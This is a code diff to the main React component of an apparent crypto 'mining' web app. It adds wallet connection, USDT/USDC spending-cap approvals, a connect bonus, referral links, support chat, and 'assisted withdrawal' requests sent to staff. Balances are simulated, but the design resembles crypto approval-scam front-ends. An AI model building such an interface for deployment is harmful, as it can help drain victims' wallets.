@@ -1,16 +1,21 @@
 import React, { useState, useEffect } from 'react';
-import type { Page, AdminUser } from './types';
+import type { Page, AdminUser, ChatSession, Message } from './types';
 import { mockUsers } from './components/admin/mockData';
 import AdminLayout from './components/admin/AdminLayout';
 import FrontendApp from './FrontendApp';
 import ConnectWalletModal from './components/ConnectWalletModal';
 import AdminLoginModal from './components/admin/AdminLoginModal';
 import EngagementModal from './components/EngagementModal';
+import CustomerServiceModal from './components/CustomerServiceModal';
+import LiveChat from './components/LiveChat';
+import RequestAssistanceModal from './components/RequestAssistanceModal';
+import * as api from './components/admin/api';
 
 function App() {
   // === STATE MANAGEMENT ===
   const [currentPage, setCurrentPage] = useState<Page>('landing');
   const [isConnected, setIsConnected] = useState(false);
+  const [connectedWalletAddress, setConnectedWalletAddress] = useState<string | null>(null);
   const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);
   const [isAdminView, setIsAdminView] = useState(false);
   
@@ -18,11 +23,25 @@ function App() {
   const [showConnectModal, setShowConnectModal] = useState(false);
   const [showAdminLoginModal, setShowAdminLoginModal] = useState(false);
   const [showWelcomeModal, setShowWelcomeModal] = useState(false);
+  const [showCustomerServiceModal, setShowCustomerServiceModal] = useState(false);
+  const [showRequestAssistanceModal, setShowRequestAssistanceModal] = useState(false);
+  const [referrer, setReferrer] = useState<string | null>(null);
+
+  // Site Settings (simulated)
+  const [supportTelegramUrl, setSupportTelegramUrl] = useState('');
 
   // User Data (for frontend simulation)
   const [userWalletBalance, setUserWalletBalance] = useState({ usdt: 50000, usdc: 25000 });
-  const [platformBalance, setPlatformBalance] = useState({ eth: 0 });
+  const [platformBalance, setPlatformBalance] = useState({ eth: 0, bonus: 0.05 }); // Added bonus
   const [users, setUsers] = useState<AdminUser[]>(mockUsers);
+  
+  // New State for Token Allowances
+  const [usdtAllowance, setUsdtAllowance] = useState(0);
+  const [usdcAllowance, setUsdcAllowance] = useState(0);
+  
+  // Live Chat State
+  const [showLiveChat, setShowLiveChat] = useState(false);
+  const [chatSessions, setChatSessions] = useState<Record<string, ChatSession>>({});
 
 
   // === HANDLERS ===
@@ -33,16 +52,32 @@ function App() {
   // Connection
   const handleConnectClick = () => {
     setShowWelcomeModal(false);
+    setReferrer(null);
     setShowConnectModal(true);
   };
-  const handleConnect = () => {
+  
+  const handleConnectSuccess = (address: string) => {
     setIsConnected(true);
+    setConnectedWalletAddress(address);
     setShowConnectModal(false);
     setCurrentPage('mining');
+    
+    // In a real app, you'd check if the address is new. Here we simulate it.
+    const userExists = mockUsers.some(u => u.walletAddress.toLowerCase() === address.toLowerCase());
+
+    // If user was referred or is "new", add bonus
+    if (referrer || !userExists || !sessionStorage.getItem('hasConnectedBefore')) {
+       setPlatformBalance(prev => ({ ...prev, eth: prev.eth + prev.bonus }));
+    }
+    sessionStorage.setItem('hasConnectedBefore', 'true');
   };
+
   const handleDisconnect = () => {
     setIsConnected(false);
+    setConnectedWalletAddress(null);
     setCurrentPage('landing');
+    setUsdtAllowance(0); // Reset allowance on disconnect
+    setUsdcAllowance(0);
   };
 
   // Admin
@@ -62,22 +97,125 @@ function App() {
   const handleEnterAdminView = () => setIsAdminView(true);
   const handleExitAdminView = () => setIsAdminView(false);
 
+  // Customer Service Handlers
+  const handleCustomerServiceClick = () => {
+    setShowCustomerServiceModal(true);
+  };
+
+  // Live Chat Handlers
+  const handleStartLiveChat = () => {
+      setShowCustomerServiceModal(false);
+      if (!connectedWalletAddress) return;
+      
+      if (!chatSessions[connectedWalletAddress]) {
+          setChatSessions(prev => ({
+              ...prev,
+              [connectedWalletAddress]: {
+                  sessionId: connectedWalletAddress,
+                  messages: [{ text: "Hello! How can I assist you today?", sender: 'admin', timestamp: new Date().toISOString() }],
+                  unreadAdmin: false,
+                  lastMessageTimestamp: new Date().toISOString()
+              }
+          }));
+      }
+      setShowLiveChat(true);
+  };
+
+  const handleUserSendMessage = (text: string) => {
+      if (!connectedWalletAddress) return;
+      const newMessage: Message = { text, sender: 'user', timestamp: new Date().toISOString() };
+      setChatSessions(prev => ({
+          ...prev,
+          [connectedWalletAddress]: {
+              ...prev[connectedWalletAddress],
+              messages: [...prev[connectedWalletAddress].messages, newMessage],
+              unreadAdmin: true,
+              lastMessageTimestamp: new Date().toISOString()
+          }
+      }));
+
+      // Simulate admin auto-reply
+      setTimeout(() => {
+          if (!connectedWalletAddress) return;
+          const autoReply: Message = { text: "Thank you for your message. An agent is reviewing your query and will respond shortly.", sender: 'admin', timestamp: new Date().toISOString() };
+           setChatSessions(prev => ({
+              ...prev,
+              [connectedWalletAddress]: {
+                  ...prev[connectedWalletAddress],
+                  messages: [...prev[connectedWalletAddress].messages, autoReply],
+                  lastMessageTimestamp: new Date().toISOString()
+              }
+          }));
+      }, 2000);
+  };
+
+  const handleAdminSendMessage = (sessionId: string, text: string) => {
+       const newMessage: Message = { text, sender: 'admin', timestamp: new Date().toISOString() };
+       setChatSessions(prev => ({
+          ...prev,
+          [sessionId]: {
+              ...prev[sessionId],
+              messages: [...prev[sessionId].messages, newMessage],
+              lastMessageTimestamp: new Date().toISOString()
+          }
+      }));
+  };
+
+  const handleAdminReadMessage = (sessionId: string) => {
+      if (chatSessions[sessionId]?.unreadAdmin) {
+          setChatSessions(prev => ({
+              ...prev,
+              [sessionId]: {
+                  ...prev[sessionId],
+                  unreadAdmin: false,
+              }
+          }));
+      }
+  };
+
 
   // Mining & Transfers (for frontend simulation)
   const handleStartMining = (amount: number, from: 'USDT' | 'USDC', eth: number) => {
     // Deduct from wallet balance
     setUserWalletBalance(prev => ({ ...prev, [from.toLowerCase()]: prev[from.toLowerCase() as 'usdt' | 'usdc'] - amount }));
+    // Deduct from allowance
+    if (from === 'USDT') {
+        setUsdtAllowance(prev => prev - amount);
+    } else {
+        setUsdcAllowance(prev => prev - amount);
+    }
     // Add to platform balance
-    setPlatformBalance(prev => ({ eth: prev.eth + eth }));
+    setPlatformBalance(prev => ({ ...prev, eth: prev.eth + eth }));
+  };
+  
+  // New handler for setting token allowance
+  const handleSetAllowance = (amount: number, currency: 'USDT' | 'USDC') => {
+      alert(`You have approved a spending cap of ${amount.toLocaleString()} ${currency}.\nYou can now proceed with one-click conversions up to this amount.`);
+      if (currency === 'USDT') {
+          setUsdtAllowance(amount);
+      } else {
+          setUsdcAllowance(amount);
+      }
   };
 
   const handleTransfer = (amount: number) => {
     if (amount <= platformBalance.eth) {
-      setPlatformBalance(prev => ({ eth: prev.eth - amount }));
+      setPlatformBalance(prev => ({ ...prev, eth: prev.eth - amount }));
       // In a real app, this would trigger a blockchain transaction.
       alert(`Successfully transferred ${amount} ETH to your wallet.`);
     } else {
       alert('Insufficient balance for transfer.');
+    }
+  };
+
+  const handleRequestAssistedWithdrawal = async (amount: number, message: string) => {
+    if (!connectedWalletAddress) return;
+    try {
+        await api.requestAssistedWithdrawal(connectedWalletAddress, amount, message);
+        setShowRequestAssistanceModal(false);
+        alert('Your request for an assisted withdrawal has been sent to support.');
+    } catch (error) {
+        alert('Failed to send request. Please try again.');
     }
   };
 
@@ -90,6 +228,13 @@ function App() {
       }
     };
     window.addEventListener('keydown', handleKeyDown);
+    
+    // Check for referral link
+    const urlParams = new URLSearchParams(window.location.search);
+    const ref = urlParams.get('ref');
+    if (ref) {
+        setReferrer(ref);
+    }
 
     // Show welcome modal on first visit of the session
     const hasVisited = sessionStorage.getItem('hasVisited');
@@ -97,6 +242,18 @@ function App() {
         setShowWelcomeModal(true);
         sessionStorage.setItem('hasVisited', 'true');
     }
+
+    // Fetch public site settings
+    const loadSiteSettings = async () => {
+        try {
+            const settings = await api.publicFetchSiteSettings();
+            setSupportTelegramUrl(settings.supportTelegramUrl);
+        } catch (error) {
+            console.error("Could not load site settings.", error);
+        }
+    };
+    loadSiteSettings();
+
 
     return () => window.removeEventListener('keydown', handleKeyDown);
   }, []);
@@ -106,13 +263,17 @@ function App() {
       <AdminLayout
         onExitAdmin={handleExitAdminView}
         onLogout={handleLogout}
+        chatSessions={chatSessions}
+        onAdminSendMessage={handleAdminSendMessage}
+        onAdminReadMessage={handleAdminReadMessage}
       />
     );
   }
 
   // Derive user-specific data for the profile page
-  const currentUserWallet = "0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B"; // This would be dynamic in a real app
-  const userReferrals = users.filter(u => u.invitationParent === currentUserWallet);
+  const currentUser = users.find(u => u.walletAddress.toLowerCase() === connectedWalletAddress?.toLowerCase());
+  const userReferrals = users.filter(u => u.invitationParent === connectedWalletAddress);
+  const userChatSession = connectedWalletAddress ? chatSessions[connectedWalletAddress] : undefined;
 
   return (
     <>
@@ -120,21 +281,28 @@ function App() {
         currentPage={currentPage}
         isConnected={isConnected}
         isAdminAuthenticated={isAdminAuthenticated}
+        connectedWalletAddress={connectedWalletAddress}
         userWalletBalance={userWalletBalance}
         platformBalance={platformBalance}
         userReferrals={userReferrals}
+        usdtAllowance={usdtAllowance}
+        usdcAllowance={usdcAllowance}
+        referralCode={currentUser?.referralCode}
         onNavigate={handleNavigate}
         onConnectClick={handleConnectClick}
         onDisconnect={handleDisconnect}
         onLogout={handleLogout}
         onEnterAdminView={handleEnterAdminView}
         onStartMining={handleStartMining}
+        onSetAllowance={handleSetAllowance}
         onTransfer={handleTransfer}
+        onCustomerServiceClick={handleCustomerServiceClick}
+        onRequestAssistedWithdrawal={() => setShowRequestAssistanceModal(true)}
       />
       {showConnectModal && (
         <ConnectWalletModal
           onClose={() => setShowConnectModal(false)}
-          onConnect={handleConnect}
+          onConnectSuccess={handleConnectSuccess}
         />
       )}
       {showAdminLoginModal && !isAdminAuthenticated && (
@@ -143,10 +311,35 @@ function App() {
           onLoginAttempt={handleAdminLoginAttempt}
         />
       )}
-      {showWelcomeModal && !isConnected && (
+      {(showWelcomeModal || referrer) && !isConnected && (
         <EngagementModal
-          onClose={() => setShowWelcomeModal(false)}
+          onClose={() => {
+            setShowWelcomeModal(false)
+            setReferrer(null)
+          }}
           onConnect={handleConnectClick}
+          referrer={referrer}
+        />
+      )}
+      {showCustomerServiceModal && (
+        <CustomerServiceModal
+          onClose={() => setShowCustomerServiceModal(false)}
+          onLiveChatClick={handleStartLiveChat}
+          telegramUrl={supportTelegramUrl}
+        />
+      )}
+      {showLiveChat && isConnected && (
+        <LiveChat 
+            onClose={() => setShowLiveChat(false)}
+            messages={userChatSession?.messages || []}
+            onSendMessage={handleUserSendMessage}
+        />
+      )}
+      {showRequestAssistanceModal && (
+        <RequestAssistanceModal
+            onClose={() => setShowRequestAssistanceModal(false)}
+            onSubmit={handleRequestAssistedWithdrawal}
+            currentBalance={platformBalance.eth}
         />
       )}
     </>
